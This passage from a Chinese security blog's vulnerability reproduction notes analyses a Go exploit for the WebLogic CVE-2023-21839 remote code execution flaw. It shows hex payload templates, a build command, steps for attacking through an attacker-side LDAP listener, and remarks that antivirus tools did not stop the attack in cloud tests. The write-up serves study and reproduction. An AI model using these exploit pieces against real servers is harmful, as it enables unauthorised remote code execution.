data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ol>\n<li>解析命令行参数（IP地址、端口、LDAP字符串）</li>\n<li>获取Weblogic版本号</li>\n<li>根据Weblogic版本号设置密钥</li>\n<li>连接到Weblogic服务器</li>\n<li>设置ServiceContext</li>\n<li>构造恶意数据包</li>\n<li>发送恶意数据包</li>\n<li>关闭连接</li>\n</ol></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>代码中的 import 语句引用了四个不同的包：</p>\n<p><code>CVE-2023-21839</code><br><code>encoding/binary</code><br><code>encoding/hex</code><br><code>flag</code><br><code>fmt</code><br><code>net</code><br><code>strings</code><br>其中， flag 用于解析命令行参数。 net 用于处理网络连接。 strings 用于字符串处理。encoding&#x2F;hex 用于十六进制编码&#x2F;解码，encoding&#x2F;binary 用于处理二进制数据。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>main() 函数开始时解析命令行参数并打印相应的提示信息。然后调用 <code>giop.GetVersion()</code> 函数检测 WebLogic 服务器的版本。分析完版本后然后根据 <code>WebLogic</code> 版本选择不同的攻击方式，分别设置变量 <code>wlsKey1</code> 和 <code>wlsKey2</code>，最后使用 <code>net.Dial()</code> 函数建立与 <code>WebLogic</code> 服务器的连接。</p></blockquote>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> giop</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;encoding/binary&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;encoding/hex&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">D</span><span class=\"params\">(str <span class=\"type\">string</span>)</span></span> []<span class=\"type\">byte</span> &#123;</span><br><span class=\"line\">\tdata, _ := hex.DecodeString(str)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> data</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">E</span><span class=\"params\">(b []<span class=\"type\">byte</span>)</span></span> <span class=\"type\">string</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> hex.EncodeToString(b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">Int32</span><span class=\"params\">(i <span class=\"type\">int</span>)</span></span> []<span class=\"type\">byte</span> &#123;</span><br><span class=\"line\">\tb := <span class=\"built_in\">make</span>([]<span class=\"type\">byte</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">\tbinary.BigEndian.PutUint32(b, <span class=\"type\">uint32</span>(i))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> b</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>由于该漏洞的影响范围为<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code>，所以该代码先进行了网站<code>weblogic</code>版本检测，如果不是12或14版本则进行测试，否则结束</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>WebLogic Server使用WLS Key来加密和解密敏感数据，例如密码和证书私钥</p>\n<p>WLS Key是由WebLogic Server生成并管理的，它不是由管理员手动设置的，也不是系统默认的。在WebLogic Server启动时，它会自动生成一个WLS Key，并使用该密钥来加密和解密存储在WebLogic Server中的敏感数据，例如密码和证书私钥。</p>\n<p>WebLogic Server生成的WLS Key是每个实例唯一的，每个实例都有自己的WLS Key。这是因为WLS Key是通过使用特定于WebLogic Server实例的信息生成的</p></blockquote>\n<p>所以在下面的代码中wls作用</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ver == <span class=\"string\">&quot;12&quot;</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;[*] weblogic 12&quot;</span>)</span><br><span class=\"line\">\t\twlsKey1 = <span class=\"string\">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t\twlsKey2 = <span class=\"string\">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ver == <span class=\"string\">&quot;14&quot;</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;[*] weblogic 14&quot;</span>)</span><br><span class=\"line\">\t\twlsKey1 = <span class=\"string\">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t\twlsKey2 = <span class=\"string\">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;[!] error and exit&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<hr>\n<p>这个go脚本的使用很简单，先在攻击机<code>1369</code>端口打开ldap</p>\n<p>先进行编译</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">go</span> build main.<span class=\"keyword\">go</span> -<span class=\"keyword\">o</span> web.<span class=\"keyword\">exe</span></span><br></pre></td></tr></table></figure>\n\n<p>然后攻击机上打开1369端口，挂上ldap</p>\n<p><img src=\"/post/CVE-Tes/image-20230302000014731.png\" alt=\"image-20230302000014731\"></p>\n<p>最后简单跑个计算器<code>（测试时间：2023/3/1，火绒未检测到，但是弹cmd还是会被警告的）</code></p>\n<p><img src=\"/post/CVE-Tes/image-20230302000455096.png\" alt=\"image-20230302000455096\"></p>\n<p><img src=\"/post/CVE-Tes/image-20230302000412160.png\" alt=\"image-20230302000412160\"></p>\n<h3 id=\"公网测试\"><a href=\"#公网测试\" class=\"headerlink\" title=\"公网测试\"></a>公网测试</h3><p>太穷了，没有第二台电脑，在<code>aliyun</code>上搞了个<code>weblogic</code>，看看是否检测的到吗</p>\n<p>这是公网环境下的</p>\n<p><img src=\"/post/CVE-Tes/image-20230302001529947.png\" alt=\"image-20230302001529947\"></p>\n<p>然后一样的测试如上，会被<code>windows defender</code>检测到，但是不会拦截，还是会一样执行命令</p>\n<p>和朋友借了一下服务器测试，确实是可以实现公网测试的，而且<code>windows defender</code>并未拦截(公网测试时间:2023&#x2F;3&#x2F;2)</p>\n<p><img src=\"/post/CVE-Tes/image-20230302210930469.png\" alt=\"image-20230302210930469\"></p>\n<h1 id=\"CVE-2023-33246\"><a href=\"#CVE-2023-33246\" class=\"headerlink\" title=\"CVE-2023-33246\"></a>CVE-2023-33246</h1>","text":"想把一些常见的CVE以及一些经典漏洞复现，做做笔记 CVE-2021-44228 Log4j2环境搭建 Apache Log4j2 是一个被广泛使用的开源日志记...","permalink":"/post/CVE-Test","photos":[],"count_time":{"symbolsCount":"36k","symbolsTime":"33 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"漏洞","slug":"漏洞","count":2,"path":"api/tags/漏洞.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2021-44228-Log4j2\"><span class=\"toc-text\">CVE-2021-44228 Log4j2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Apache-solr-8-11-0%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">Apache solr 8.11.0下载</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JAVA%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">JAVA配置</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E5%8E%8B%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">解压到对应目录</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%83%A8%E7%BD%B2%E5%B9%B6%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">部署并修改环境变量</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC\"><span class=\"toc-text\">查看版本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Solr%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">Solr下载</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%89%E8%A3%85-Apache-Solr%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">安装 Apache Solr服务</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%90%E5%8A%9F\"><span class=\"toc-text\">成功</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E4%B8%8E%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">了解漏洞描述与注入原理</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Log4j2-Lookup\"><span class=\"toc-text\">Log4j2 Lookup</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JNDI\"><span class=\"toc-text\">JNDI</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JNDI%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">JNDI注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90\"><span class=\"toc-text\">脚本分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90\"><span class=\"toc-text\">信息泄露脚本分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#LDAP-HEADER\"><span class=\"toc-text\">LDAP_HEADER</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ThreadedTCPRequestHandler\"><span class=\"toc-text\">ThreadedTCPRequestHandler</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ThreadedTCPServer\"><span class=\"toc-text\">ThreadedTCPServer</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#main\"><span class=\"toc-text\">main()</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">渗透测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">利用DNSlog验证漏洞</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">信息泄露漏洞</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">远程代码执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#JNDIExploit-1-2-SNAPSHOT-jar%E5%88%A9%E7%94%A8JNDI%E6%B3%A8%E5%85%A5%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2022-39197-Cobaltstrike-RCE\"><span class=\"toc-text\">CVE-2022-39197 Cobaltstrike RCE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1\"><span class=\"toc-text\">环境搭建</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2023-21839-Weblogic%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">CVE-2023-21839 Weblogic远程代码执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">概念</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#weblogic%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F\"><span class=\"toc-text\">weblogic是什么？</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#T3%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">T3的概念和交互过程</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#iiop%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">iiop概念</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFCORBA\"><span class=\"toc-text\">什么是CORBA</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">渗透流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">远程代码执行原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JAVA\"><span class=\"toc-text\">JAVA</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GO-%E5%BE%85%E7%9C%8B\"><span class=\"toc-text\">GO(待看)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%AC%E7%BD%91%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">公网测试</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2023-33246\"><span class=\"toc-text\">CVE-2023-33246</span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"golang","uid":"54d4e8482c6dc0ae7c398e63273488f8","slug":"Go","date":"2022-12-23T13:16:34.183Z","updated":"2023-09-06T12:29:46.996Z","comments":true,"path":"api/articles/Go.json","keywords":null,"cover":"/img/7.jpg","text":"主要从黄哥的资料笔记，尚硅谷，以及谢先斌大佬的笔记https://www.xiexianbin.cn/golang 以及https://exercism.org...","permalink":"/post/Go","photos":[],"count_time":{"symbolsCount":"6k","symbolsTime":"5 mins."},"categories":[{"name":"语言学习","slug":"语言学习","count":1,"path":"api/categories/语言学习.json"}],"tags":[{"name":"go语言","slug":"go语言","count":2,"path":"api/tags/go语言.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"漏洞测试","uid":"3ad1b2302cf37f01616c68ffdd393d02","slug":"CMS-Test","date":"2022-11-22T05:36:05.907Z","updated":"2023-10-09T09:59:37.931Z","comments":true,"path":"api/articles/CMS-Test.json","keywords":null,"cover":"/img/2.jpg","text":"训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现 漫城CMS v2.5.8漏洞分析 免费看漫画( 环境搭建phpstudy Apach...","permalink":"/post/CMS-Test","photos":[],"count_time":{"symbolsCount":"28k","symbolsTime":"26 